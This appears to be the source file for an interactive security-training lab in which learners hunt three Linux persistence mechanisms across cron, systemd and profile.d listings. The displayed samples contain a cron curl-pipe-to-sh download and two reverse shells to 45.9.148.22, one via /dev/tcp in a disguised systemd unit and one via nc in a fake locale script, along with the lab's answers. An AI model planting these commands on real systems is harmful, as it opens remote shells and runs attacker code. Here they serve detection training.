"use client";

import { useState } from "react";
import { TaskShell, MonoInput, SubmitBtn, verifyStage, useRevealedFlags } from "./lab-ui";
import { HintPanel } from "./hint-panel";

/**
 * Linux Persistence Hunt.
 *
 * Three persistence mechanisms are planted across cron, systemd and a shell
 * profile. The learner must find each without a scanner — the point is that
 * persistence hides in places that look administrative.
 */

const CRONTAB = `# /etc/crontab and /var/spool/cron listings (merged)

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

17 *  * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6  * * *   root    test -x /usr/sbin/anacron || run-parts --report /etc/cron.daily
30 2  * * 1   root    /usr/local/bin/backup-db.sh --full
*/7 *  * * *   www-data  curl -fsSL http://45.9.148.22/s.sh | sh
0  3  * * *   root    /usr/bin/certbot renew --quiet`;

const SYSTEMD = `$ systemctl list-timers --all | head
NEXT                        LEFT       UNIT                     ACTIVATES
Sat 2026-08-02 03:00:00 UTC 8h left    logrotate.timer          logrotate.service
Sat 2026-08-02 06:25:00 UTC 11h left   apt-daily.timer          apt-daily.service
Sat 2026-08-02 00:10:00 UTC 5h left    sysstat-collect.timer    sysstat-collect.service

$ cat /etc/systemd/system/sysstat-collect.service
[Unit]
Description=System statistics collection

[Service]
Type=oneshot
ExecStart=/usr/lib/sysstat/sa1 1 1
ExecStartPost=/bin/bash -c 'exec 5<>/dev/tcp/45.9.148.22/8080; cat <&5 | sh >&5 2>&5'

[Install]
WantedBy=multi-user.target

$ stat -c '%y %n' /etc/systemd/system/sysstat-collect.service
2026-07-28 02:14:07 /etc/systemd/system/sysstat-collect.service`;

const PROFILE = `$ ls -la /etc/profile.d/
-rw-r--r-- 1 root root  1610 Mar 11  2024 bash_completion.sh
-rw-r--r-- 1 root root   825 Mar 11  2024 debuginfod.sh
-rw-r--r-- 1 root root   206 Jul 28 02:16 01-locale-fix.sh
-rw-r--r-- 1 root root  1003 Mar 11  2024 vte.sh

$ cat /etc/profile.d/01-locale-fix.sh
# Locale correction for non-UTF8 terminals
export LANG=en_GB.UTF-8
export LC_ALL=en_GB.UTF-8
if [ "$(id -u)" = "0" ]; then
  (setsid /bin/bash -c 'while :; do /usr/bin/nc 45.9.148.22 4444 -e /bin/bash; sleep 300; done' &) >/dev/null 2>&1
fi`;


export function LinuxPersistenceHuntClient({
  labId,
  completedStages: initial,
}: {
  labId: string;
  completedStages: string[];
}) {
  const [completed, setCompleted] = useState<string[]>(initial);
  const [revealed, addReveal] = useRevealedFlags(labId);
  const [tab, setTab] = useState<"cron" | "systemd" | "profile">("cron");

  const [t1, setT1] = useState("");
  const [e1, setE1] = useState("");
  const [t2, setT2] = useState("");
  const [e2, setE2] = useState("");
  const [t3, setT3] = useState("");
  const [e3, setE3] = useState("");

  const done = (s: string) => completed.includes(s);

  function markDone(stage: string, reveal?: string) {
    setCompleted((p) => (p.includes(stage) ? p : [...p, stage]));
    addReveal(stage, reveal);
  }

  async function submitOne(e: React.FormEvent) {
    e.preventDefault();
    const verdict = await verifyStage(labId, "task_1", t1);
    if (verdict.correct) {
      setE1("");
      markDone("task_1", verdict.reveal);
    } else {
      setE1("Look for an entry that fetches and executes remote content.");
    }
  }

  async function submitTwo(e: React.FormEvent) {
    e.preventDefault();
    const verdict = await verifyStage(labId, "task_2", t2);
    if (verdict.correct) {
      setE2("");
      markDone("task_2", verdict.reveal);
    } else {
      setE2("Which directive in the unit file runs the reverse shell? Name it exactly.");
    }
  }

  async function submitThree(e: React.FormEvent) {
    e.preventDefault();
    const verdict = await verifyStage(labId, "task_3", t3);
    if (verdict.correct) {
      setE3("");
      markDone("task_3", verdict.reveal);
    } else {
      setE3("Give the file. Compare modification dates against the others.");
    }
  }

  const TABS = [
    { id: "cron" as const, label: "cron" },
    { id: "systemd" as const, label: "systemd" },
    { id: "profile" as const, label: "profile.d" },
  ];

  const body = tab === "cron" ? CRONTAB : tab === "systemd" ? SYSTEMD : PROFILE;

  return (
    <div className="space-y-4">
      <div className="rounded-lg border border-white/10 bg-zinc-900/50 p-5">
        <p className="text-[10px] uppercase tracking-widest text-zinc-500">Brief</p>
        <p className="mt-2 text-sm text-zinc-400">
          A web server was compromised on 28 July. It has been rebuilt twice and the
          attacker keeps coming back, which means persistence survived the rebuild. Three
          separate mechanisms are present. Find all three.
        </p>
      </div>

      <div className="flex gap-2">
        {TABS.map((t) => (
          <button
            key={t.id}
            type="button"
            onClick={() => setTab(t.id)}
            className={`rounded-md border px-3 py-1.5 font-mono text-xs transition-colors ${
              tab === t.id
                ? "border-sage-500/50 bg-sage-500/10 text-sage-400"
                : "border-white/10 text-zinc-500 hover:border-white/25"
            }`}
          >
            {t.label}
          </button>
        ))}
      </div>

      <pre className="overflow-x-auto rounded-lg border border-white/10 bg-zinc-900/70 p-4 font-mono text-xs leading-relaxed text-zinc-300">
        {body}
      </pre>

      <TaskShell number={1} title="The cron entry" unlocked completed={done("task_1")}>
        <p className="mb-3 text-sm text-zinc-400">
          One crontab line does not belong. Give the IP address it contacts.
        </p>
        {done("task_1") ? (
          <p className="text-sm text-sage-400">
            Correct. A www-data job piping a remote script straight into sh, every seven
            minutes.
          </p>
        ) : (
          <form onSubmit={submitOne}>
            <MonoInput value={t1} onChange={setT1} placeholder="ip address" />
            {e1 && <p className="mt-2 text-xs text-red-400">{e1}</p>}
            <div className="mt-3">
              <SubmitBtn />
            </div>
          </form>
        )}
        <HintPanel labId={labId} stage="task_1" />
      </TaskShell>

      <TaskShell number={2} title="The systemd unit" unlocked={done("task_1")} completed={done("task_2")}>
        <p className="mb-3 text-sm text-zinc-400">
          A real service name was reused to hide a reverse shell. Which systemd directive
          carries the malicious command?
        </p>
        {done("task_2") ? (
          <p className="text-sm text-sage-400">
            Correct — ExecStartPost. The legitimate ExecStart runs sar, so the unit looks
            right at a glance and passes a casual review.
          </p>
        ) : (
          <form onSubmit={submitTwo}>
            <MonoInput value={t2} onChange={setT2} placeholder="directive name" />
            {e2 && <p className="mt-2 text-xs text-red-400">{e2}</p>}
            <div className="mt-3">
              <SubmitBtn />
            </div>
          </form>
        )}
        <HintPanel labId={labId} stage="task_2" />
      </TaskShell>

      <TaskShell number={3} title="The shell profile" unlocked={done("task_2")} completed={done("task_3")}>
        <p className="mb-3 text-sm text-zinc-400">
          The third mechanism fires whenever root opens a shell. Name the file.
        </p>
        {done("task_3") ? (
          <p className="text-sm text-sage-400">
            Correct — 01-locale-fix.sh, modified 28 July while every legitimate file dates
            from the 2024 build. Mismatched timestamps in a system directory are one of the
            cheapest persistence checks you can run.
          </p>
        ) : (
          <form onSubmit={submitThree}>
            <MonoInput value={t3} onChange={setT3} placeholder="filename or path" className="w-96 max-w-full" />
            {e3 && <p className="mt-2 text-xs text-red-400">{e3}</p>}
            <div className="mt-3">
              <SubmitBtn />
            </div>
          </form>
        )}
        <HintPanel labId={labId} stage="task_3" />
      </TaskShell>
    </div>
  );
}
